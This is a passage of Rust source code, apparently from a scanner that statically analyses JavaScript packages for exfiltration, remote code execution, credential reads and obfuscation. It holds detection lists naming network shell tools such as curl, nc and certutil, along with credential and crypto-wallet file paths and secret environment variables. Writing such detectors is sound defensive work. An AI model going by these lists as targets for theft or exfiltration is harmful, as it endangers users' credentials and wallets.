//! Static analysis of one JavaScript file.
//!
//! Three traversals over the oxc AST:
//!   1. collect — module aliases (`const https = require('https')`), constant
//!      strings / objects, local function parameters, relative requires;
//!   2. taint   — repeated to a fixpoint: which local names hold secrets,
//!      environment variables or machine fingerprints;
//!   3. detect  — network sinks and where they point, secret → sink flows,
//!      remote eval, CI-gated network calls, credential reads, obfuscation.
//!
//! Taint is name-based and file-wide (flow-insensitive). That over-approximates
//! a little, which is the right direction for a tool that only ever warns.

use std::collections::{HashMap, HashSet};

use base64::{engine::general_purpose::STANDARD as B64, Engine};
use oxc_allocator::Allocator;
use oxc_ast::ast::*;
use oxc_ast_visit::{walk, Visit};
use oxc_parser::{ParseOptions, Parser};
use oxc_span::{SourceType, Span};
use oxc_syntax::scope::ScopeFlags;

use super::dest;
use crate::util::{clip, entropy};

/// Placeholder for a part of a string we couldn't evaluate.
pub const HOLE: char = '§';

#[derive(Clone, Debug, PartialEq)]
pub struct Hit {
    pub id: &'static str,
    pub severity: crate::model::Severity,
    pub title: String,
    pub detail: String,
    pub line: u32,
    pub evidence: String,
    /// URLs / hosts this hit sends to (may be empty).
    pub urls: Vec<String>,
}

#[derive(Clone, Debug, Default)]
pub struct FileReport {
    pub path: String,
    pub parsed: bool,
    /// Relative module specifiers this file loads (`./x`, `../y`).
    pub requires: Vec<String>,
    pub hits: Vec<Hit>,
    /// Every destination a network sink in this file points at (with how it was found).
    pub sink_urls: Vec<(String, u32)>,
    pub has_network_sink: bool,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum SinkKind {
    Http,
    Tcp,
    Udp,
    Dns,
    Ws,
    Exec,
}

#[derive(Clone, Debug, Default)]
struct Skel {
    text: String,
    complete: bool,
    decoded: bool,
}

#[derive(Clone, Debug)]
enum ConstVal {
    Str(Skel),
    Obj(HashMap<String, Skel>),
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Mode {
    Collect,
    Taint,
    Detect,
}

const NETWORK_TOOLS: &[&str] = &[
    "curl", "wget", "nc", "ncat", "netcat", "socat", "powershell", "pwsh", "invoke-webrequest", "iwr",
    "invoke-restmethod", "irm", "bitsadmin", "certutil", "telnet", "ftp", "tftp", "scp", "sftp",
];

const CI_VARS: &[&str] = &[
    "CI", "GITHUB_ACTIONS", "GITLAB_CI", "CIRCLECI", "TRAVIS", "JENKINS_URL", "BUILDKITE", "TF_BUILD",
    "CODEBUILD_BUILD_ID", "BITBUCKET_BUILD_NUMBER", "DRONE", "TEAMCITY_VERSION", "VERCEL", "NETLIFY",
];

pub fn secret_name(n: &str) -> bool {
    let u = n.to_ascii_uppercase();
    const EXACT: &[&str] = &["NPM_TOKEN", "NODE_AUTH_TOKEN", "GITHUB_TOKEN", "GH_TOKEN", "API_KEY", "NPM_CONFIG__AUTH"];
    EXACT.contains(&u.as_str())
        || u.starts_with("AWS_")
        || u.starts_with("AZURE_")
        || u.starts_with("GOOGLE_APPLICATION")
        || ["_TOKEN", "_SECRET", "_KEY", "_PASSWORD", "_PASS", "_PASSWD", "_CREDENTIALS", "_AUTH"].iter().any(|s| u.ends_with(s))
        || u.contains("SECRET")
        || u.contains("PRIVATE_KEY")
}

/// Paths whose contents are credentials (matched against an evaluated path skeleton).
pub fn sensitive_path(p: &str) -> Option<&'static str> {
    let l = p.to_ascii_lowercase().replace('\\', "/");
    const RULES: &[(&str, &str)] = &[
        (".npmrc", "npm credentials (~/.npmrc)"),
        (".yarnrc", "yarn credentials"),
        ("/.ssh/", "SSH keys"),
        (".ssh/id_", "SSH keys"),
        ("id_rsa", "SSH keys"),
        ("id_ed25519", "SSH keys"),
        (".aws/credentials", "AWS credentials"),
        (".aws/config", "AWS config"),
        (".config/gcloud", "Google Cloud credentials"),
        (".azure/", "Azure credentials"),
        (".kube/config", "Kubernetes credentials"),
        (".docker/config.json", "Docker registry credentials"),
        (".git-credentials", "git credentials"),
        (".netrc", "netrc credentials"),
        (".gitconfig", "git config"),
        (".bash_history", "shell history"),
        (".zsh_history", "shell history"),
        ("/etc/passwd", "system accounts"),
        ("/etc/shadow", "system password hashes"),
        ("local storage/leveldb", "browser local storage"),
        ("login data", "browser saved passwords"),
        ("/cookies", "browser cookies"),
        ("nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask wallet"),
        ("exodus", "Exodus wallet"),
        (".electrum", "Electrum wallet"),
        ("/.bitcoin", "Bitcoin wallet"),
        ("wallet.dat", "crypto wallet"),
        ("keychain", "OS keychain"),
    ];
    if l.ends_with(".env") || l.contains("/.env") || l == ".env" || l.contains(".env.local") {
        return Some(".env secrets");
    }
    RULES.iter().find(|(needle, _)| l.contains(needle)).map(|(_, what)| *what)
}

fn normalize_module(m: &str) -> String {
    let m = m.strip_prefix("node:").unwrap_or(m);
    match m {
        "fs/promises" => "fs.promises".into(),
        "dns/promises" => "dns.promises".into(),
        "timers/promises" => "timers.promises".into(),
        _ => m.to_string(),
    }
}

fn strip_global(p: &str) -> &str {
    for g in ["globalThis.", "global.", "window.", "self."] {
        if let Some(rest) = p.strip_prefix(g) {
            return rest;
        }
    }
    p
}

fn sink_kind(path: &str, is_new: bool) -> Option<SinkKind> {
    let p = strip_global(path);
    let http = [
        "http.request", "http.get", "https.request", "https.get", "http2.connect", "fetch", "undici.request",
        "undici.fetch", "undici.stream", "undici.Client", "node-fetch", "cross-fetch", "isomorphic-fetch", "axios",
        "got", "request", "needle", "superagent", "phin", "ky", "make-fetch-happen", "minipass-fetch",
    ];
    if http.contains(&p) {
        return Some(SinkKind::Http);
    }
    if let Some((base, _)) = p.split_once('.') {
        if ["axios", "got", "request", "needle", "superagent", "ky", "undici"].contains(&base) {
            return Some(SinkKind::Http);
        }
    }
    if is_new && (p == "XMLHttpRequest") {
        return Some(SinkKind::Http);
    }
    if is_new && (p == "WebSocket" || p == "ws" || p == "ws.WebSocket" || p == "EventSource") {
        return Some(SinkKind::Ws);
    }
    if ["net.connect", "net.createConnection", "tls.connect", "net.Socket"].contains(&p) {
        return Some(SinkKind::Tcp);
    }
    if p == "dgram.createSocket" {
        return Some(SinkKind::Udp);
    }
    if let Some(rest) = p.strip_prefix("dns.promises.").or_else(|| p.strip_prefix("dns.")) {
        if rest == "lookup" || rest.starts_with("resolve") || rest == "reverse" {
            return Some(SinkKind::Dns);
        }
    }
    if let Some(rest) = p.strip_prefix("child_process.") {
        if ["exec", "execSync", "spawn", "spawnSync", "execFile", "execFileSync"].contains(&rest) {
            return Some(SinkKind::Exec);
        }
    }
    if ["execa", "execa.command", "execa.commandSync", "execa.sync", "cross-spawn", "shelljs.exec"].contains(&p) {
        return Some(SinkKind::Exec);
    }
    None
}

fn eval_like(path: &str, is_new: bool) -> bool {
    let p = strip_global(path);
    matches!(
        p,
        "eval" | "Function" | "vm.runInThisContext" | "vm.runInNewContext" | "vm.runInContext" | "vm.compileFunction"
    ) || (is_new && p == "vm.Script")
}

struct LineIndex(Vec<u32>);

impl LineIndex {
    fn new(src: &str) -> Self {
        let mut v = vec![0u32];
        for (i, b) in src.bytes().enumerate() {
            if b == b'\n' {
                v.push(i as u32 + 1);
            }
        }
        LineIndex(v)
    }
    fn line(&self, offset: u32) -> u32 {
        match self.0.binary_search(&offset) {
            Ok(i) => i as u32 + 1,
            Err(i) => i as u32,
        }
    }
}

struct Ctx<'s> {
    src: &'s str,
    lines: LineIndex,
    mode: Mode,
    alias: HashMap<String, String>,
    consts: HashMap<String, ConstVal>,
    fn_params: HashMap<String, Vec<String>>,
    tainted: HashMap<String, String>,
    taint_changed: bool,
    handles: HashMap<String, (SinkKind, Vec<String>)>,
    decoded_names: HashSet<String>,
    requires: Vec<String>,
    ci_depth: u32,
    report: FileReport,
    // deferred decisions (need whole-file knowledge)
    eval_sites: Vec<(u32, String, bool)>, // line, evidence, arg involves decoding
    ci_sinks: Vec<(u32, String, Vec<String>)>,
    secret_reads: Vec<(u32, String, String)>, // line, evidence, what
    hidden_dest: Vec<(u32, String, String)>,  // decoded destinations used in sinks
    big_literals: u32,
}

impl<'s> Ctx<'s> {
    fn line(&self, span: Span) -> u32 {
        self.lines.line(span.start)
    }

    fn evidence(&self, span: Span) -> String {
        let raw = self.src.get(span.start as usize..span.end as usize).unwrap_or("");
        let collapsed: String = raw.split_whitespace().collect::<Vec<_>>().join(" ");
        clip(&collapsed, 180)
    }

    // ---- name resolution -------------------------------------------------

    fn require_arg(&self, c: &CallExpression) -> Option<String> {
        if !c.callee.is_specific_id("require") || c.arguments.len() != 1 {
            return None;
        }
        let a = c.arguments[0].as_expression()?;
        let s = self.skel(a);
        s.complete.then_some(s.text)
    }

    /// Canonical dotted path of an expression: `https.request`, `child_process.exec`,
    /// `process.env.NPM_TOKEN`. Local aliases are resolved.
    fn path_of(&self, e: &Expression) -> Option<String> {
        match e.without_parentheses() {
            Expression::Identifier(id) => {
                let n = id.name.as_str();
                Some(self.alias.get(n).cloned().unwrap_or_else(|| n.to_string()))
            }
            Expression::StaticMemberExpression(m) => {
                let base = self.path_of(&m.object)?;
                Some(format!("{base}.{}", m.property.name.as_str()))
            }
            Expression::ComputedMemberExpression(m) => {
                let base = self.path_of(&m.object)?;
                let k = self.skel(&m.expression);
                k.complete.then(|| format!("{base}.{}", k.text))
            }
            Expression::CallExpression(c) => self.require_arg(c).map(|m| normalize_module(&m)),
            Expression::ChainExpression(ch) => match &ch.expression {
                ChainElement::StaticMemberExpression(m) => {
                    let base = self.path_of(&m.object)?;
                    Some(format!("{base}.{}", m.property.name.as_str()))
                }
                _ => None,
            },
            _ => None,
        }
        .map(|p| strip_global(&p).to_string())
    }

    // ---- constant evaluation ----------------------------------------------

    /// Evaluate an expression to a string skeleton: constants folded, unknown
    /// parts replaced by HOLE. Understands concatenation, templates,
    /// String.fromCharCode, Buffer.from(…,'base64'|'hex').toString(), atob,
    /// [..].join(''), and .split('').reverse().join('').
    fn skel(&self, e: &Expression) -> Skel {
        self.skel_depth(e, 0)
    }

    fn hole() -> Skel {
        Skel { text: HOLE.to_string(), complete: false, decoded: false }
    }

    fn skel_depth(&self, e: &Expression, depth: u32) -> Skel {
        if depth > 24 {
            return Self::hole();
        }
        let d = depth + 1;
        match e.without_parentheses() {
            Expression::StringLiteral(s) => Skel { text: s.value.as_str().to_string(), complete: true, decoded: false },
            Expression::NumericLiteral(n) => Skel { text: format_num(n.value), complete: true, decoded: false },
            Expression::TemplateLiteral(t) => {
                let mut out = Skel { text: String::new(), complete: true, decoded: false };
                for (i, q) in t.quasis.iter().enumerate() {
                    out.text.push_str(q.value.cooked.as_ref().map(|c| c.as_str()).unwrap_or(q.value.raw.as_str()));
                    if let Some(ex) = t.expressions.get(i) {
                        let s = self.skel_depth(ex, d);
                        out.complete &= s.complete;
                        out.decoded |= s.decoded;
                        out.text.push_str(&s.text);
                    }
                }
                out
            }
            Expression::BinaryExpression(b) if b.operator == BinaryOperator::Addition => {
                let l = self.skel_depth(&b.left, d);
                let r = self.skel_depth(&b.right, d);
                Skel { text: l.text + &r.text, complete: l.complete && r.complete, decoded: l.decoded || r.decoded }
            }
            Expression::Identifier(id) => match self.consts.get(id.name.as_str()) {
                Some(ConstVal::Str(s)) => s.clone(),
                _ => Self::hole(),
            },
            Expression::StaticMemberExpression(m) => {
                if let Expression::Identifier(id) = &m.object {
                    if let Some(ConstVal::Obj(o)) = self.consts.get(id.name.as_str()) {
                        if let Some(v) = o.get(m.property.name.as_str()) {
                            return v.clone();
                        }
                    }
                }
                Self::hole()
            }
            Expression::CallExpression(c) => self.skel_call(c, d),
            _ => Self::hole(),
        }
    }

    fn skel_call(&self, c: &CallExpression, d: u32) -> Skel {
        let arg = |i: usize| c.arguments.get(i).and_then(|a| a.as_expression());
        let callee = self.path_of(&c.callee).unwrap_or_default();
        // String.fromCharCode(104, 116, …)
        if callee == "String.fromCharCode" {
            let mut s = String::new();
            for a in &c.arguments {
                match a.as_expression().map(|e| self.skel_depth(e, d)) {
                    Some(k) if k.complete => match k.text.parse::<u32>().ok().and_then(char::from_u32) {
                        Some(ch) => s.push(ch),
                        None => return Self::hole(),
                    },
                    _ => return Self::hole(),
                }
            }
            return Skel { text: s, complete: true, decoded: true };
        }
        if callee == "atob" {
            if let Some(a) = arg(0) {
                let k = self.skel_depth(a, d);
                if k.complete {
                    if let Some(t) = decode_b64(&k.text) {
                        return Skel { text: t, complete: true, decoded: true };
                    }
                }
            }
            return Self::hole();
        }
        if callee == "decodeURIComponent" || callee == "unescape" {
            if let Some(a) = arg(0) {
                let k = self.skel_depth(a, d);
                return Skel { text: percent_decode(&k.text), complete: k.complete, decoded: true };
            }
        }
        // Method calls on an evaluated receiver.
        if let Expression::StaticMemberExpression(m) = c.callee.without_parentheses() {
            let method = m.property.name.as_str();
            // Buffer.from(s, enc).toString([enc])
            if method == "toString" {
                if let Expression::CallExpression(inner) = m.object.without_parentheses() {
                    if self.path_of(&inner.callee).as_deref() == Some("Buffer.from") {
                        let src = inner.arguments.first().and_then(|a| a.as_expression()).map(|e| self.skel_depth(e, d));
                        let enc = inner
                            .arguments
                            .get(1)
                            .and_then(|a| a.as_expression())
                            .map(|e| self.skel_depth(e, d).text)
                            .unwrap_or_else(|| "utf8".into());
                        if let Some(src) = src.filter(|s| s.complete) {
                            let decoded = match enc.as_str() {
                                "base64" | "base64url" => decode_b64(&src.text),
                                "hex" => hex::decode(&src.text).ok().and_then(|b| String::from_utf8(b).ok()),
                                _ => Some(src.text.clone()),
                            };
                            if let Some(t) = decoded {
                                return Skel { text: t, complete: true, decoded: enc != "utf8" };
                            }
                        }
                    }
                }
                return self.skel_depth(&m.object, d);
            }
            if method == "join" {
                let sep = arg(0).map(|e| self.skel_depth(e, d)).map(|s| s.text).unwrap_or_else(|| ",".into());
                // [..].join(sep)
                if let Expression::ArrayExpression(arr) = m.object.without_parentheses() {
                    let mut parts = Vec::new();
                    let mut complete = true;
                    let mut decoded = false;
                    for el in &arr.elements {
                        let k = el.as_expression().map(|e| self.skel_depth(e, d)).unwrap_or_else(Self::hole);
                        complete &= k.complete;
                        decoded |= k.decoded;
                        parts.push(k.text);
                    }
                    return Skel { text: parts.join(&sep), complete, decoded };
                }
                // "abc".split('').reverse().join('')
                if let Expression::CallExpression(rev) = m.object.without_parentheses() {
                    if let Expression::StaticMemberExpression(rm) = rev.callee.without_parentheses() {
                        if rm.property.name.as_str() == "reverse" {
                            if let Expression::CallExpression(split) = rm.object.without_parentheses() {
                                if let Expression::StaticMemberExpression(sm) = split.callee.without_parentheses() {
                                    if sm.property.name.as_str() == "split" {
                                        let base = self.skel_depth(&sm.object, d);
                                        if base.complete {
                                            return Skel { text: base.text.chars().rev().collect(), complete: true, decoded: true };
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if method == "concat" {
                let mut out = self.skel_depth(&m.object, d);
                for a in &c.arguments {
                    let k = a.as_expression().map(|e| self.skel_depth(e, d)).unwrap_or_else(Self::hole);
                    out.complete &= k.complete;
                    out.decoded |= k.decoded;
                    out.text.push_str(&k.text);
                }
                return out;
            }
            if matches!(method, "trim" | "toLowerCase" | "toUpperCase") {
                let k = self.skel_depth(&m.object, d);
                let text = match method {
                    "trim" => k.text.trim().to_string(),
                    "toLowerCase" => k.text.to_lowercase(),
                    _ => k.text.to_uppercase(),
                };
                return Skel { text, ..k };
            }
        }
        // path.join / path.resolve keep the pieces (useful for credential paths)
        if matches!(callee.as_str(), "path.join" | "path.resolve" | "path.posix.join") {
            let parts: Vec<String> = c
                .arguments
                .iter()
                .map(|a| a.as_expression().map(|e| self.skel_depth(e, d).text).unwrap_or_else(|| HOLE.to_string()))
                .collect();
            return Skel { text: parts.join("/"), complete: false, decoded: false };
        }
        if matches!(callee.as_str(), "os.homedir" | "os.tmpdir") {
            return Skel { text: "~".into(), complete: false, decoded: false };
        }
        Self::hole()
    }

    fn obj_skel(&self, o: &ObjectExpression, d: u32) -> HashMap<String, Skel> {
        let mut m = HashMap::new();
        for p in &o.properties {
            if let ObjectPropertyKind::ObjectProperty(p) = p {
                if let Some(k) = p.key.static_name() {
                    m.insert(k.to_string(), self.skel_depth(&p.value, d));
                }
            }
        }
        m
    }

    // ---- taint -----------------------------------------------------------

    /// If `e` carries secret / env / machine data, describe where it came from.
    fn taint(&self, e: &Expression) -> Option<String> {
        self.taint_depth(e, 0)
    }

    fn taint_depth(&self, e: &Expression, depth: u32) -> Option<String> {
        if depth > 32 {
            return None;
        }
        let d = depth + 1;
        let e = e.without_parentheses();
        if let Some(p) = self.path_of(e) {
            if p == "process.env" {
                return Some("process.env (every environment variable)".into());
            }
            if let Some(var) = p.strip_prefix("process.env.") {
                if secret_name(var) {
                    return Some(format!("process.env.{var}"));
                }
            }
        }
        match e {
            Expression::Identifier(id) => self.tainted.get(id.name.as_str()).cloned(),
            Expression::StaticMemberExpression(m) => self.taint_depth(&m.object, d),
            Expression::ComputedMemberExpression(m) => {
                if self.path_of(&m.object).as_deref() == Some("process.env") {
                    let k = self.skel(&m.expression);
                    if !k.complete {
                        return Some("process.env[…] (computed name)".into());
                    }
                    return None;
                }
                self.taint_depth(&m.object, d)
            }
            Expression::CallExpression(c) => {
                let callee = self.path_of(&c.callee).unwrap_or_default();
                if matches!(callee.as_str(), "os.hostname" | "os.userInfo" | "os.networkInterfaces" | "os.homedir") {
                    return Some(format!("{callee}()"));
                }
                if let Some(what) = self.cred_read(c) {
                    return Some(what);
                }
                // transforms that preserve the data
                let transform = [
                    "JSON.stringify", "Buffer.from", "encodeURIComponent", "encodeURI", "escape", "btoa", "String",
                    "Object.keys", "Object.entries", "Object.values", "Object.assign", "Object.fromEntries", "Array.from",
                    "querystring.stringify", "qs.stringify", "zlib.gzipSync", "zlib.deflateSync",
                ];
                if transform.contains(&callee.as_str()) {
                    for a in &c.arguments {
                        if let Some(t) = a.as_expression().and_then(|x| self.taint_depth(x, d)) {
                            return Some(t);
                        }
                    }
                }
                // method on tainted receiver: secret.toString(), env.map(…), data.slice()
                if let Expression::StaticMemberExpression(m) = c.callee.without_parentheses() {
                    return self.taint_depth(&m.object, d);
                }
                None
            }
            Expression::NewExpression(n) => {
                let callee = self.path_of(&n.callee).unwrap_or_default();
                if matches!(callee.as_str(), "URLSearchParams" | "Blob" | "TextEncoder") {
                    for a in &n.arguments {
                        if let Some(t) = a.as_expression().and_then(|x| self.taint_depth(x, d)) {
                            return Some(t);
                        }
                    }
                }
                None
            }
            Expression::TemplateLiteral(t) => t.expressions.iter().find_map(|x| self.taint_depth(x, d)),
            Expression::BinaryExpression(b) => self.taint_depth(&b.left, d).or_else(|| self.taint_depth(&b.right, d)),
            Expression::LogicalExpression(l) => self.taint_depth(&l.left, d).or_else(|| self.taint_depth(&l.right, d)),
            Expression::ConditionalExpression(c) => {
                self.taint_depth(&c.consequent, d).or_else(|| self.taint_depth(&c.alternate, d))
            }
            Expression::ObjectExpression(o) => o.properties.iter().find_map(|p| match p {
                ObjectPropertyKind::ObjectProperty(p) => self.taint_depth(&p.value, d),
                ObjectPropertyKind::SpreadProperty(s) => self.taint_depth(&s.argument, d),
            }),
            Expression::ArrayExpression(a) => a.elements.iter().find_map(|el| match el {
                ArrayExpressionElement::SpreadElement(s) => self.taint_depth(&s.argument, d),
                _ => el.as_expression().and_then(|x| self.taint_depth(x, d)),
            }),
            Expression::AwaitExpression(a) => self.taint_depth(&a.argument, d),
            Expression::SequenceExpression(s) => s.expressions.last().and_then(|x| self.taint_depth(x, d)),
            Expression::TaggedTemplateExpression(t) => t.quasi.expressions.iter().find_map(|x| self.taint_depth(x, d)),
            _ => None,
        }
    }

    /// `fs.readFileSync(<credential path>)` → what it reads.
    fn cred_read(&self, c: &CallExpression) -> Option<String> {
        let callee = self.path_of(&c.callee)?;
        let reads = [
            "fs.readFileSync", "fs.readFile", "fs.promises.readFile", "fs.createReadStream", "fs-extra.readFile",
            "fs-extra.readFileSync", "fs-extra.readJson", "fs-extra.readJsonSync", "fs.readdirSync", "fs.readdir",
        ];
        if !reads.contains(&callee.as_str()) {
            return None;
        }
        let p = self.skel(c.arguments.first()?.as_expression()?);
        sensitive_path(&p.text).map(|what| format!("{what} ({})", clip(&p.text, 60)))
    }

    fn mark_taint(&mut self, name: &str, why: String) {
        if !self.tainted.contains_key(name) {
            self.tainted.insert(name.to_string(), why);
            self.taint_changed = true;
        }
    }

    // ---- CI gating -------------------------------------------------------

    fn is_ci_test(&self, e: &Expression) -> bool {
        self.ci_depth_check(e, 0)
    }

    fn ci_depth_check(&self, e: &Expression, depth: u32) -> bool {
        if depth > 16 {
            return false;
        }
        let d = depth + 1;
        if let Some(p) = self.path_of(e) {
            if let Some(var) = p.strip_prefix("process.env.") {
                if CI_VARS.contains(&var) {
                    return true;
                }
            }
        }
        match e.without_parentheses() {
            Expression::CallExpression(c) => {
                matches!(self.path_of(&c.callee).as_deref(), Some("os.hostname") | Some("os.userInfo"))
                    || c.arguments.iter().any(|a| a.as_expression().is_some_and(|x| self.ci_depth_check(x, d)))
                    || matches!(&c.callee, Expression::StaticMemberExpression(m) if self.ci_depth_check(&m.object, d))
            }
            Expression::BinaryExpression(b) => self.ci_depth_check(&b.left, d) || self.ci_depth_check(&b.right, d),
            Expression::LogicalExpression(l) => self.ci_depth_check(&l.left, d) || self.ci_depth_check(&l.right, d),
            Expression::UnaryExpression(u) => self.ci_depth_check(&u.argument, d),
            Expression::StaticMemberExpression(m) => self.ci_depth_check(&m.object, d),
            _ => false,
        }
    }

    // ---- sinks -----------------------------------------------------------

    /// Destinations named by a sink call's arguments.
    fn sink_urls(&self, kind: SinkKind, args: &[Argument]) -> (Vec<String>, bool) {
        let mut urls = Vec::new();
        let mut decoded = false;
        let exprs: Vec<&Expression> = args.iter().filter_map(|a| a.as_expression()).collect();
        let push = |s: Skel, urls: &mut Vec<String>, decoded: &mut bool| {
            if s.text.is_empty() {
                return;
            }
            *decoded |= s.decoded;
            if dest::host_of(&s.text).is_some() {
                urls.push(s.text);
            } else {
                urls.extend(dest::extract_urls(&s.text));
            }
        };
        match kind {
            SinkKind::Exec => {
                let mut cmd = exprs.first().map(|e| self.skel(e)).unwrap_or_default();
                if let Some(Expression::ArrayExpression(arr)) = exprs.get(1).map(|e| e.without_parentheses()) {
                    for el in &arr.elements {
                        if let Some(x) = el.as_expression() {
                            let k = self.skel(x);
                            cmd.text.push(' ');
                            cmd.text.push_str(&k.text);
                            cmd.decoded |= k.decoded;
                        }
                    }
                }
                decoded |= cmd.decoded;
                urls.extend(dest::extract_urls(&cmd.text));
            }
            SinkKind::Tcp => {
                // net.connect(port, host) | net.connect({ host, port })
                for e in &exprs {
                    match e.without_parentheses() {
                        Expression::ObjectExpression(o) => {
                            let m = self.obj_skel(o, 0);
                            if let Some(h) = m.get("host").or_else(|| m.get("hostname")) {
                                push(h.clone(), &mut urls, &mut decoded);
                            }
                        }
                        other => {
                            let s = self.skel(other);
                            if s.complete && s.text.parse::<u32>().is_err() {
                                push(s, &mut urls, &mut decoded);
                            }
                        }
                    }
                }
            }
            _ => {
                for (i, e) in exprs.iter().enumerate() {
                    match e.without_parentheses() {
                        Expression::ObjectExpression(o) => {
                            let m = self.obj_skel(o, 0);
                            push_options(&m, &mut urls, &mut decoded);
                        }
                        Expression::Identifier(id) if matches!(self.consts.get(id.name.as_str()), Some(ConstVal::Obj(_))) => {
                            if let Some(ConstVal::Obj(m)) = self.consts.get(id.name.as_str()) {
                                push_options(m, &mut urls, &mut decoded);
                            }
                        }
                        Expression::ArrowFunctionExpression(_) | Expression::FunctionExpression(_) => {}
                        other if i == 0 || kind == SinkKind::Dns => push(self.skel(other), &mut urls, &mut decoded),
                        _ => {}
                    }
                }
            }
        }
        urls.sort();
        urls.dedup();
        (urls, decoded)
    }

    fn on_sink(&mut self, span: Span, kind: SinkKind, path: &str, args: &[Argument]) {
        let line = self.line(span);
        let ev = self.evidence(span);
        let (urls, decoded) = self.sink_urls(kind, args);
        if kind != SinkKind::Exec {
            self.report.has_network_sink = true;
        }
        for u in urls.iter().filter(|_| kind != SinkKind::Exec) {
            self.report.sink_urls.push((u.clone(), line));
            if decoded {
                self.hidden_dest.push((line, ev.clone(), u.clone()));
            }
        }
        if self.ci_depth > 0 && kind != SinkKind::Exec {
            self.ci_sinks.push((line, ev.clone(), urls.clone()));
        }

        // Which arguments carry data out? (exec: only the command, never the options)
        let data_args: Vec<&Expression> = match kind {
            SinkKind::Exec => args.iter().take(2).filter_map(|a| a.as_expression()).collect(),
            SinkKind::Tcp | SinkKind::Udp => vec![],
            _ => args
                .iter()
                .filter_map(|a| a.as_expression())
                .filter(|e| !matches!(e, Expression::ArrowFunctionExpression(_) | Expression::FunctionExpression(_)))
                .collect(),
        };
        let leak = data_args.iter().find_map(|e| self.taint(e));

        if kind == SinkKind::Exec {
            let cmd = {
                let mut c = args.first().and_then(|a| a.as_expression()).map(|e| self.skel(e).text).unwrap_or_default();
                if let Some(Expression::ArrayExpression(arr)) = args.get(1).and_then(|a| a.as_expression()) {
                    for el in &arr.elements {
                        if let Some(x) = el.as_expression() {
                            c.push(' ');
                            c.push_str(&self.skel(x).text);
                        }
                    }
                }
                c
            };
            let tools = network_tools_in(&cmd);
            if !tools.is_empty() {
                self.report.has_network_sink = true;
                let pipes_to_shell = pipes_to_shell(&cmd);
                self.push_hit(Hit {
                    id: if pipes_to_shell { "code.remote-eval" } else { "exec.network-tool" },
                    severity: if pipes_to_shell { crate::model::Severity::High } else { crate::model::Severity::Medium },
                    title: if pipes_to_shell {
                        "downloads code and pipes it to a shell".into()
                    } else {
                        format!("spawns {}", tools.join(", "))
                    },
                    detail: format!("{path} runs: {}", clip(&cmd.replace(HOLE, "…"), 160)),
                    line,
                    evidence: ev.clone(),
                    urls: urls.clone(),
                });
                if let Some(src) = &leak {
                    self.push_exfil(line, &ev, &urls, src, path);
                }
            }
            return;
        }

        if kind == SinkKind::Dns {
            let host_arg = args.first().and_then(|a| a.as_expression());
            if let Some(src) = host_arg.and_then(|e| self.taint(e)) {
                self.push_hit(Hit {
                    id: "net.exfil-flow",
                    severity: crate::model::Severity::High,
                    title: "hides data in DNS lookups".into(),
                    detail: format!("{src} is built into the hostname passed to {path}; a DNS query leaks it to whoever runs that domain's nameserver"),
                    line,
                    evidence: ev,
                    urls,
                });
            }
            return;
        }

        if let Some(src) = leak {
            self.push_exfil(line, &ev, &urls, &src, path);
        }
    }

    fn push_exfil(&mut self, line: u32, ev: &str, urls: &[String], src: &str, path: &str) {
        self.push_hit(Hit {
            id: "net.exfil-flow",
            severity: crate::model::Severity::High,
            title: "sends secrets or environment data over the network".into(),
            detail: format!("{src} reaches {path}"),
            line,
            evidence: ev.to_string(),
            urls: urls.to_vec(),
        });
    }

    fn push_hit(&mut self, h: Hit) {
        if !self.report.hits.iter().any(|x| x.id == h.id && x.line == h.line && x.detail == h.detail) {
            self.report.hits.push(h);
        }
    }

    /// `.write(x)` / `.end(x)` / `.send(x)` on a request, socket or XHR.
    fn on_handle_method(&mut self, c: &CallExpression, m: &StaticMemberExpression) {
        let method = m.property.name.as_str();
        let handle = match m.object.without_parentheses() {
            Expression::Identifier(id) => self.handles.get(id.name.as_str()).cloned(),
            Expression::CallExpression(inner) => self
                .path_of(&inner.callee)
                .and_then(|p| sink_kind(&p, false))
                .filter(|k| *k != SinkKind::Exec && *k != SinkKind::Dns)
                .map(|k| (k, self.sink_urls(k, &inner.arguments).0)),
            _ => None,
        };
        let Some((_kind, urls)) = handle else { return };
        if method == "open" {
            // xhr.open(method, url)
            if let (Expression::Identifier(id), Some(u)) =
                (m.object.without_parentheses(), c.arguments.get(1).and_then(|a| a.as_expression()))
            {
                let s = self.skel(u);
                if dest::host_of(&s.text).is_some() {
                    let line = self.line(c.span);
                    self.report.sink_urls.push((s.text.clone(), line));
                    if let Some(h) = self.handles.get_mut(id.name.as_str()) {
                        h.1.push(s.text);
                    }
                }
            }
            return;
        }
        if !matches!(method, "write" | "end" | "send" | "sendto") {
            return;
        }
        let leak = c.arguments.iter().filter_map(|a| a.as_expression()).find_map(|e| self.taint(e));
        if let Some(src) = leak {
            let ev = self.evidence(c.span);
            let line = self.line(c.span);
            self.push_exfil(line, &ev, &urls, &src, &format!(".{method}() on a network connection"));
        }
    }

    // ---- binding helpers -------------------------------------------------

    fn bind_declarator(&mut self, id: &BindingPattern, init: &Expression) {
        match id {
            BindingPattern::BindingIdentifier(b) => {
                let name = b.name.as_str().to_string();
                match self.mode {
                    Mode::Collect => self.collect_binding(&name, init),
                    Mode::Taint => {
                        if let Some(t) = self.taint(init) {
                            self.mark_taint(&name, t);
                        }
                    }
                    Mode::Detect => {
                        if let Some(p) = self.callish_path(init) {
                            if let Some(k) = sink_kind(&p, matches!(init.without_parentheses(), Expression::NewExpression(_))) {
                                if k != SinkKind::Exec && k != SinkKind::Dns {
                                    let urls = self.callish_args(init).map(|a| self.sink_urls(k, a).0).unwrap_or_default();
                                    self.handles.insert(name, (k, urls));
                                }
                            }
                        }
                    }
                }
            }
            BindingPattern::ObjectPattern(op) => {
                let src_path = self.path_of(init);
                for prop in &op.properties {
                    let Some(key) = prop.key.static_name() else { continue };
                    let BindingPattern::BindingIdentifier(local) = &prop.value else { continue };
                    let local = local.name.as_str().to_string();
                    match self.mode {
                        Mode::Collect => {
                            // const { request } = require('https')
                            if let Expression::CallExpression(c) = init.without_parentheses() {
                                if let Some(m) = self.require_arg(c) {
                                    self.alias.insert(local.clone(), format!("{}.{key}", normalize_module(&m)));
                                    continue;
                                }
                            }
                            if let Some(p) = &src_path {
                                if !p.starts_with("process.env") {
                                    self.alias.insert(local.clone(), format!("{p}.{key}"));
                                }
                            }
                        }
                        Mode::Taint => {
                            if src_path.as_deref() == Some("process.env") && secret_name(&key) {
